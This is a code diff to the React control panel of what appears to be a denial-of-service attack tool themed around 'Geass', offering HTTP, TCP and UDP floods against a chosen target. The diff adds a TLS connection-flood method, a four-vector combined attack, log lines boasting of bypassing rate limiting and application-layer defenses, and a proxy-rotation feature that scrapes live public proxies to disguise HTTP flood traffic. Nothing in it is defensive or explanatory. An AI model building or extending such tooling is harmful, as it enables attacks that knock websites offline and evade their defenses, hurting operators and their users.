@@ -26,16 +26,18 @@ interface AnalyzeResult  { target: string; ip: string | null; isIP: boolean; htt
 interface NamedTarget    { url: string; label: string; }
 
 /* ── Method classification ── */
-const L7_HTTP_FE = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
-const L4_TCP_FE  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
-const L4_UDP_FE  = new Set(["udp-flood","udp-bypass"]);
+const L7_HTTP_FE  = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
+const L4_TCP_FE   = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst","conn-flood"]);
+const L4_UDP_FE   = new Set(["udp-flood","udp-bypass"]);
+const L7_PROXY_OK = new Set(["http-flood","http-bypass","http-pipeline"]);
 const methodInfo = (m: string) => {
-  if (m === "geass-override") return { badge: "GEASS ∞",  cls: "geass",    color: "#C0392B" };
-  if (m === "http2-flood")    return { badge: "REAL H2",  cls: "real-http", color: "#1abc9c" };
-  if (m === "slowloris")      return { badge: "SLOWLORIS", cls: "real-http", color: "#9b59b6" };
-  if (L7_HTTP_FE.has(m))     return { badge: "REAL HTTP", cls: "real-http", color: "#2ecc71" };
-  if (L4_TCP_FE.has(m))      return { badge: "REAL TCP",  cls: "real-tcp",  color: "#3498db" };
-  if (L4_UDP_FE.has(m))      return { badge: "REAL UDP",  cls: "real-udp",  color: "#e67e22" };
+  if (m === "geass-override") return { badge: "GEASS ∞",   cls: "geass",    color: "#C0392B" };
+  if (m === "http2-flood")    return { badge: "REAL H2",   cls: "real-http", color: "#1abc9c" };
+  if (m === "slowloris")      return { badge: "SLOWLORIS",  cls: "real-http", color: "#9b59b6" };
+  if (m === "conn-flood")     return { badge: "CONN FLOOD", cls: "real-tcp",  color: "#e74c3c" };
+  if (L7_HTTP_FE.has(m))     return { badge: "REAL HTTP",  cls: "real-http", color: "#2ecc71" };
+  if (L4_TCP_FE.has(m))      return { badge: "REAL TCP",   cls: "real-tcp",  color: "#3498db" };
+  if (L4_UDP_FE.has(m))      return { badge: "REAL UDP",   cls: "real-udp",  color: "#e67e22" };
   return { badge: "SIMULATED", cls: "simulated", color: "#8A7B65" };
 };
 
@@ -173,13 +175,21 @@ const LOG_MSGS_SIM = [
   () => `👁 Amplification multiplier calculated — simulated vector active`,
   (_t: string, n: string) => `👁 ${n} pkt/s — amplification vector engaged`,
 ];
+const LOG_MSGS_CONN = [
+  (t: string, n: string) => `👁 ${n} TLS connections held open → ${t} [CONN FLOOD]`,
+  (_t: string, n: string) => `👁 ${n} simultaneous sockets open — bypassing HTTP rate limiting`,
+  (t: string) => `👁 ${t} connection table filling — TLS handshakes overwhelming server`,
+  (_t: string, n: string) => `👁 ${n} conn/s — 16K socket storm, server fd pool saturating`,
+  (t: string) => `👁 Direct TLS pressure on ${t} — bypassing all application-layer defenses`,
+];
 const LOG_MSGS_GEASS = [
-  (t: string, n: string) => `👁 Geass Override: ${n} vectors annihilating ${t} [HTTP+TCP+UDP]`,
-  (t: string) => `👁 Triple-layer assault — ${t} has no counter to this Geass`,
-  (_t: string, n: string) => `👁 ${n} simultaneous HTTP+TCP+UDP strikes — target cannot respond`,
-  (t: string) => `👁 ${t} connection table, HTTP stack and UDP pipe under absolute siege`,
-  (_t: string, n: string) => `👁 ${n} requests this second — triple concurrent vectors active`,
-  (t: string) => `👁 The king's Geass has been cast upon ${t} — obey`,
+  (t: string, n: string) => `👁 Geass Override QUAD-VECTOR: ${n} strikes annihilating ${t}`,
+  (t: string) => `👁 QUAD assault active — Conn Flood + Slowloris + H2 + UDP on ${t}`,
+  (_t: string, n: string) => `👁 ${n} simultaneous CONN+SLOW+H2+UDP strikes — target cannot respond`,
+  (t: string) => `👁 ${t} overwhelmed — 4 concurrent attack vectors, no shield can hold`,
+  (_t: string, n: string) => `👁 ${n} req/s quad-vector — connection table, HTTP stack, TLS & UDP under siege`,
+  (t: string) => `👁 The king's Geass has been cast upon ${t} — absolute subjugation`,
+  (_t: string, n: string) => `👁 ${n} total vectors this second — CONN FLOOD + SLOWLORIS + H2 + UDP`,
 ];
 
 /* ── Sparkline chart ── */
@@ -330,6 +340,13 @@ function Panel() {
   const [isAnalyzing, setIsAnalyzing]   = useState(false);
   const [showAnalyze, setShowAnalyze]   = useState(false);
 
+  /* Proxy rotation */
+  interface ProxyEntry { host: string; port: number; responseMs: number; }
+  const [proxies, setProxies]           = useState<ProxyEntry[]>([]);
+  const [proxyEnabled, setProxyEnabled] = useState(false);
+  const [proxyFetching, setProxyFetching] = useState(false);
+  const [showProxyPanel, setShowProxyPanel] = useState(false);
+
   /* Refs */
   const terminalRef    = useRef<HTMLDivElement>(null);
   const startTimeRef   = useRef<number | null>(null);
@@ -392,6 +409,7 @@ function Panel() {
         if (method === "geass-override")  msgs = LOG_MSGS_GEASS;
         else if (method === "http2-flood") msgs = LOG_MSGS_H2;
         else if (method === "slowloris")  msgs = LOG_MSGS_SLOW;
+        else if (method === "conn-flood") msgs = LOG_MSGS_CONN;
         else if (L7_HTTP_FE.has(method)) msgs = LOG_MSGS_HTTP;
         else if (L4_TCP_FE.has(method))  msgs = LOG_MSGS_TCP;
         else if (L4_UDP_FE.has(method))  msgs = LOG_MSGS_UDP;
@@ -576,6 +594,7 @@ function Panel() {
     }
     if (soundRef.current) playTone("start");
     if ("vibrate" in navigator) navigator.vibrate([200]);
+    if (proxyUsable) addLog(`👁 Proxy rotation enabled — ${proxies.length} proxies in pool [HTTP only]`, "success");
 
     try {
       const result = await createAttack.mutateAsync({
@@ -805,6 +824,37 @@ function Panel() {
     } catch { addLog("✕ Benchmark failed.", "error"); }
   }
 
+  async function handleFetchProxies() {
+    if (proxyFetching) return;
+    setProxyFetching(true);
+    addLog("👁 Fetching live proxies from 5 public sources — testing connectivity...", "info");
+    try {
+      await fetch(`${BASE}/api/proxies/refresh`, { method: "POST" });
+      // Poll until fetch completes (backend does it async after responding)
+      let attempts = 0;
+      const poll = setInterval(async () => {
+        try {
+          const r = await fetch(`${BASE}/api/proxies/count`);
+          const d = await r.json() as { count: number; fetching: boolean };
+          if (!d.fetching) {
+            clearInterval(poll);
+            // Load final list
+            const r2 = await fetch(`${BASE}/api/proxies`);
+            const d2 = await r2.json() as { count: number; proxies: { host: string; port: number; responseMs: number }[] };
+            setProxies(d2.proxies ?? []);
+            addLog(`👁 Proxy scan complete — ${d2.count} live proxies found`, d2.count > 0 ? "success" : "warn");
+            if (d2.count > 0) addLog(`👁 Fastest: ${d2.proxies[0]?.host}:${d2.proxies[0]?.port} (${d2.proxies[0]?.responseMs}ms)`, "info");
+            setProxyFetching(false);
+          }
+        } catch { /**/ }
+        if (++attempts > 40) { clearInterval(poll); setProxyFetching(false); }
+      }, 3000);
+    } catch {
+      addLog("✕ Proxy fetch failed — check backend connection.", "error");
+      setProxyFetching(false);
+    }
+  }
+
   /* ── Derived values ── */
   const pw = powerLevel(threads, method);
   const mi = methodInfo(method);
@@ -813,12 +863,14 @@ function Panel() {
   const totalPackets = localPkts  + (isRunning ? clusterTotalPkts  : 0);
   const totalBytes   = localBytes + (isRunning ? clusterTotalBytes : 0);
   const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1;
+  const proxyUsable  = proxyEnabled && proxies.length > 0 && L7_PROXY_OK.has(method);
 
   // Intensity for GeassEye animation (0–1 based on pps relative to a high reference)
   const eyeIntensity = isRunning ? Math.min(1, pps / 50000) : 0;
   const sparklineColor = method === "geass-override" ? "#C0392B"
     : method === "http2-flood" ? "#1abc9c"
     : method === "slowloris"   ? "#9b59b6"
+    : method === "conn-flood"  ? "#e74c3c"
     : L7_HTTP_FE.has(method)   ? "#2ecc71"
     : L4_TCP_FE.has(method)    ? "#3498db"
     : L4_UDP_FE.has(method)    ? "#e67e22"
@@ -1230,6 +1282,65 @@ function Panel() {
                             <button className="lb-fav-rm" onClick={() => removeClusterNode(node)}>✕</button>
                           </div>
                         ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+              {/* ── Proxy Rotation ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => setShowProxyPanel(v => !v)}>
+                  {showProxyPanel ? "▲" : "▼"} Proxy Rotation
+                  {proxies.length > 0 && (
+                    <span className={`lb-cluster-badge${proxyEnabled ? " lb-cluster-badge--active" : ""}`}>
+                      {proxies.length} LIVE{proxyEnabled ? " · ON" : ""}
+                    </span>
+                  )}
+                  {proxyFetching && <span className="lb-cluster-badge lb-cluster-badge--fetching">SCANNING...</span>}
+                </label>
+                {showProxyPanel && (
+                  <div className="lb-cluster-body">
+                    <div className="lb-cluster-hint">
+                      Fetches live HTTP proxies from 5 public sources and tests them. Rotation applies to HTTP Flood, HTTP Bypass, and HTTP Pipeline only.
+                    </div>
+                    <div className="lb-proxy-controls">
+                      <button
+                        className={`lb-cluster-add-btn lb-proxy-fetch-btn${proxyFetching ? " lb-proxy-fetching" : ""}`}
+                        onClick={handleFetchProxies}
+                        disabled={proxyFetching}
+                      >
+                        {proxyFetching ? "⏳ SCANNING..." : "🌐 FETCH PROXIES"}
+                      </button>
+                      {proxies.length > 0 && (
+                        <label className="lb-smart-lb-toggle">
+                          <input type="checkbox" checked={proxyEnabled} onChange={e => setProxyEnabled(e.target.checked)}/>
+                          <span className="lb-smart-lb-label">
+                            Enable proxy rotation
+                            {proxyUsable && <span style={{ color: "#2ecc71" }}> [ACTIVE for {method}]</span>}
+                            {proxyEnabled && !proxyUsable && method && (
+                              <span style={{ color: "#e67e22" }}> [not applicable for {method}]</span>
+                            )}
+                          </span>
+                        </label>
+                      )}
+                    </div>
+                    {proxies.length > 0 && (
+                      <div className="lb-proxy-list">
+                        <div className="lb-proxy-header">
+                          <span className="lb-proxy-stat">{proxies.length} live proxies</span>
+                          <span className="lb-proxy-stat">avg {Math.round(proxies.slice(0,20).reduce((a,p)=>a+p.responseMs,0)/Math.min(20,proxies.length))}ms</span>
+                          <span className="lb-proxy-stat">fastest: {proxies[0]?.responseMs}ms</span>
+                        </div>
+                        {proxies.slice(0, 6).map((p, i) => (
+                          <div key={i} className="lb-cluster-node">
+                            <span className="lb-cluster-node-dot" style={{ background: p.responseMs < 500 ? "#2ecc71" : p.responseMs < 1500 ? "#e67e22" : "#C0392B" }}/>
+                            <span className="lb-cluster-node-url">{p.host}:{p.port}</span>
+                            <span className="lb-proxy-ms">{p.responseMs}ms</span>
+                          </div>
+                        ))}
+                        {proxies.length > 6 && (
+                          <div className="lb-proxy-more">+{proxies.length - 6} more proxies in rotation pool</div>
+                        )}
                       </div>
                     )}
                   </div>
